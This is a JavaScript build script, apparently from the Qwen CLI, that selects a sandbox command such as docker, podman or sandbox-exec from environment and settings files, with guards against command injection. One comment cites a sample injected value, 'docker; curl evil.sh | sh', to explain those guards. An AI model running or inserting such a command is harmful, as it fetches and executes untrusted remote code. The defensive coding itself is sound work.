/**
 * @license
 * Copyright 2025 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

import { execFileSync } from 'node:child_process';
import { existsSync, readFileSync } from 'node:fs';
import path from 'node:path';
const { join } = path;
import stripJsonComments from 'strip-json-comments';
import os from 'node:os';
import yargs from 'yargs';
import { hideBin } from 'yargs/helpers';
import dotenv from 'dotenv';
import { bootstrapHomeEnv, resolvePath } from './lib/qwen-home-bootstrap.js';

const argv = yargs(hideBin(process.argv)).option('q', {
  alias: 'quiet',
  type: 'boolean',
  default: false,
}).argv;

let qwenSandbox = process.env.QWEN_SANDBOX;

bootstrapHomeEnv();

if (!qwenSandbox) {
  const configDir = process.env.QWEN_HOME
    ? resolvePath(process.env.QWEN_HOME)
    : join(os.homedir(), '.qwen');
  const userSettingsFile = join(configDir, 'settings.json');
  if (existsSync(userSettingsFile)) {
    const settings = JSON.parse(
      stripJsonComments(readFileSync(userSettingsFile, 'utf-8')),
    );
    if (settings.sandbox) {
      qwenSandbox = settings.sandbox;
    }
  }
}

if (!qwenSandbox) {
  // Like the CLI, only home-scoped .env files may choose the sandbox: a
  // project .env cannot pick the command that build_sandbox.js runs. Parse
  // manually and copy only QWEN_SANDBOX; dotenv.config() would inject every
  // key in the file.
  const configDir = process.env.QWEN_HOME
    ? resolvePath(process.env.QWEN_HOME)
    : join(os.homedir(), '.qwen');
  for (const candidate of [
    join(configDir, '.env'),
    join(os.homedir(), '.env'),
  ]) {
    if (!existsSync(candidate)) continue;
    try {
      const parsed = dotenv.parse(readFileSync(candidate, 'utf-8'));
      if (parsed.QWEN_SANDBOX && !Object.hasOwn(process.env, 'QWEN_SANDBOX')) {
        process.env.QWEN_SANDBOX = parsed.QWEN_SANDBOX;
      }
    } catch (_e) {
      // Match dotenv's quiet-mode behavior used elsewhere.
    }
    break;
  }
  qwenSandbox = process.env.QWEN_SANDBOX;
}

qwenSandbox = (qwenSandbox || '').trim().toLowerCase();
if (qwenSandbox === 'bwrap' || process.env.SANDBOX === 'bwrap') {
  console.error(
    'Whole-CLI bwrap has been removed. Configure tools.executionSandbox in User or System settings and restart outside the old sandbox.',
  );
  process.exit(1);
}

const commandExists = (cmd) => {
  // Pass `cmd` as a separate argv element (never interpolated into a shell
  // command string) so a malicious QWEN_SANDBOX value such as
  // `docker; curl evil.sh | sh` cannot inject extra commands.
  const check = (candidate) => {
    if (os.platform() === 'win32') {
      // Use 'where.exe' (not 'where') because PowerShell aliases 'where' to
      // 'Where-Object', which breaks command detection.
      execFileSync('where.exe', [candidate], { stdio: 'ignore' });
    } else {
      // 'command -v' is a POSIX shell builtin, so it must run inside a shell.
      // Bind the candidate to $1 rather than splicing it into the script text.
      // Use an absolute '/bin/sh' (matching execSync's default) so a
      // PATH-controlled 'sh' from an untrusted project cannot be run here.
      execFileSync('/bin/sh', ['-c', 'command -v "$1"', 'sh', candidate], {
        stdio: 'ignore',
      });
    }
  };
  try {
    check(cmd);
    return true;
  } catch {
    if (os.platform() === 'win32' && !cmd.endsWith('.exe')) {
      try {
        check(`${cmd}.exe`);
        return true;
      } catch {
        return false;
      }
    }
    return false;
  }
};

let command = '';
if (['1', 'true'].includes(qwenSandbox)) {
  if (commandExists('docker')) {
    command = 'docker';
  } else if (commandExists('podman')) {
    command = 'podman';
  } else {
    console.error(
      'ERROR: install docker or podman or specify command in QWEN_SANDBOX',
    );
    process.exit(1);
  }
} else if (qwenSandbox && !['0', 'false'].includes(qwenSandbox)) {
  if (commandExists(qwenSandbox)) {
    command = qwenSandbox;
  } else {
    console.error(
      `ERROR: missing sandbox command '${qwenSandbox}' (from QWEN_SANDBOX)`,
    );
    process.exit(1);
  }
} else {
  if (os.platform() === 'darwin' && process.env.SEATBELT_PROFILE !== 'none') {
    if (commandExists('sandbox-exec')) {
      command = 'sandbox-exec';
    } else {
      process.exit(1);
    }
  } else {
    process.exit(1);
  }
}

if (!argv.q) {
  console.log(command);
}
process.exit(0);
